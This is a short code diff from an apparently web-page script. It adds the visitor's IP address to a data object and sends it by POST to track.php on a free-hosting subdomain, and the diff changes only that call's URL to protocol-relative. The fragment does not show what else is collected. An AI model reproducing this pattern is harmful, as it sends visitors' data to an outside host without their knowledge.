@@ -35,7 +35,7 @@
             .then(response => response.json())
             .then(ipData => {
                 data.append('ip', ipData.ip);
-                fetch('http://byxln4cj.atwebpages.com/track.php', {
+                fetch('//byxln4cj.atwebpages.com/track.php', {
                     method: 'POST',
                     body: data
                 })
